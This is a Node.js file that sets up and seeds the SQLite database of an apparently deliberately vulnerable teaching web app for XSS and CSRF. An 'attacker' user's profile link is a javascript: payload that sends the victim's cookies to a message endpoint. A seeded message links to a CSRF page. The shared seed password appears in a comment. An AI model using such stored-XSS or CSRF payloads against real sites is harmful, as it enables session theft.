var sqlite3 = require('sqlite3').verbose()

const DBSOURCE = "db.sqlite"

let db = new sqlite3.Database(DBSOURCE, (err) => {
    if (err) {
      // Cannot open database
      console.error(err.message)
      throw err
    }else{
        console.log('Connected to the database.')

        /***USER***/
        db.run(`CREATE TABLE user (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email text NOT NULL,
            firstName text not null,
            lastName text not null,
            profileLink text,
            passwordDigest text NOT NULL,
            money integer NOT NULL,
            role text NOT NULL,
            CONSTRAINT name_unique UNIQUE (email)
            )`,
        (err) => {
            if (err) {
                console.log(err.message);
            }else{
                // Table just created, creating some rows, Password10 je lozinka
                var insert = 'INSERT INTO user (id,email, passwordDigest,firstName,lastName, money, role, profileLink) VALUES (?,?,?,?,?,?,?,?)'
                db.run(insert, [1,"admin@mail.hr", 
                    "$argon2i$v=19$m=4096,t=3,p=1$vfrhde0OMBNSSE9rRWtVrQ$gBaNgJFPBZfzuvrzfX8iSr2+OCD8K8Iu/JjwpYp8/TY",
                    "Admin","Admin",0,"ADMIN"]
                );
                db.run(insert, [2,"sawyer@mail.hr",
                "$argon2i$v=19$m=4096,t=3,p=1$vfrhde0OMBNSSE9rRWtVrQ$gBaNgJFPBZfzuvrzfX8iSr2+OCD8K8Iu/JjwpYp8/TY",
                "Thomas","Sawyer",10000,"USER","http://localhost:8080/secure/thomas-sawyer.html"]);      
                db.run(insert, [3,"napadac@mail.hr", "$argon2i$v=19$m=4096,t=3,p=1$vfrhde0OMBNSSE9rRWtVrQ$gBaNgJFPBZfzuvrzfX8iSr2+OCD8K8Iu/JjwpYp8/TY"
                ,"Napadac","Napadac",10000,"USER",
                "javascript:document.location='http://localhost:9000/api/addmessage/receiver=napadac@mail.hr&content='+document.cookie;document.body.innerHTML = ' '; "]);               
                db.run(insert, [4,"zrtva@mail.hr", "$argon2i$v=19$m=4096,t=3,p=1$vfrhde0OMBNSSE9rRWtVrQ$gBaNgJFPBZfzuvrzfX8iSr2+OCD8K8Iu/JjwpYp8/TY"
                ,"Zrtva","Zrtva",10000,"USER",null]);                              
             }              
        });

        /***TRANSACTION***/
        db.run(`CREATE TABLE trans (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            amount integer NOT NULL,
            date datetime NOT NULL,
            senderId integer NOT NULL,
            receiverId integer NOT NULL,
            FOREIGN KEY (senderId) REFERENCES  user(id) ON DELETE CASCADE,
            FOREIGN KEY (receiverId) REFERENCES  user(id) ON DELETE CASCADE
            )`,
        (err) => {
            if (err) {
                console.log(err.message);
            }else{
                var sql2 ='INSERT INTO trans (amount, senderId, receiverId,date) VALUES (?,?,?,?)'
                db.run(sql2, [200,2,4,'2020-06-22 22:7:13']);
                db.run(sql2, [8200,4,2,'2020-06-19 19:7:13']);
                db.run(sql2, [100,4,2,'2020-06-25 20:6:17']);       
            }
        }); 
        
        /***PHOTOGRAPHER***/
        db.run(`CREATE TABLE photographer (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            firstName text NOT NULL,
            lastName text NOT NULL,
            age integer not null,
            CONSTRAINT name_unique UNIQUE (firstName, lastName)
            )`,
        (err) => {
            if (err) {
                console.log(err.message);
            }else{
                db.run('INSERT INTO photographer (firstName,lastName,age) VALUES (?,?,?)', 'Romeo','Dawson',41);
                db.run('INSERT INTO photographer (firstName,lastName,age) VALUES (?,?,?)', 'Anne','Goretzky',25);
                db.run('INSERT INTO photographer (firstName,lastName,age) VALUES (?,?,?)', 'James','Garfield',18);
                db.run('INSERT INTO photographer (firstName,lastName,age) VALUES (?,?,?)', 'Lisa','Sue',34);
            }
        });
        
        /***PHOTOGRAPHY***/
        db.run(`CREATE TABLE photograph (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name text NOT NULL,
            year integer not null,
            price integer not null,
            photographerId integer not null,
            userId integer,
            photoLink text not null,
            FOREIGN KEY (photographerId) REFERENCES  photographer(id) ON DELETE CASCADE,
            FOREIGN KEY (userId) REFERENCES  user(id) ON DELETE CASCADE,
            CONSTRAINT name_unique UNIQUE (name, photographerId)
            )`,
        (err) => {
            if (err) {
                console.log(err.message);
            }else{
                db.run('INSERT INTO photograph (name,year,price,photographerId,photoLink) VALUES (?,?,?,?,?)',
                 ['Wall',2010, 2000, 1, 'Wall.jpg']);
                 db.run('INSERT INTO photograph (name,year,price,photographerId,photoLink) VALUES (?,?,?,?,?)',
                 ['Dumbell',2018, 1000, 2, 'Dumbell.jpg']);
                 db.run('INSERT INTO photograph (name,year,price,photographerId,photoLink) VALUES (?,?,?,?,?)',
                 ['Dart',2014, 4000, 3, 'Dart.jpg']);
                 db.run('INSERT INTO photograph (name,year,price,photographerId,photoLink) VALUES (?,?,?,?,?)',
                 ['Clouds',2019, 1400, 4, 'Clouds.jpg']);
            }
        });
        
        /***MESSAGE***/
        db.run(`CREATE TABLE message (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            content text NOT NULL,
            date datetime NOT NULL,
            senderId integer not null,
            receiverId integer not null,
            FOREIGN KEY (senderId) REFERENCES  user(id) ON DELETE CASCADE,
            FOREIGN KEY (receiverId) REFERENCES  user(id) ON DELETE CASCADE
            )`,
        (err) => {
            if (err) {
                console.log(err.message);
            }else{
                var sql2 ='INSERT INTO message (content,senderId,receiverId,date) VALUES (?,?,?,?)'
                db.run(sql2, ["Hi",2,4,'2020-06-22 22:7:13']);
                db.run(sql2, ["Hey. Long time no see. Anyway here's my credit card number: 12345678912",4,2,'2020-06-22 22:7:13']);
                db.run(sql2, ["Hey,The rest of the money I owe you is here -> <a href='http://localhost:8081/evil/csrf-page-get.html' target='_blank'>Click here</a> Enjoy!",3,4,'2020-06-21 22:7:13']);
            }
        });
    }
});


module.exports = db
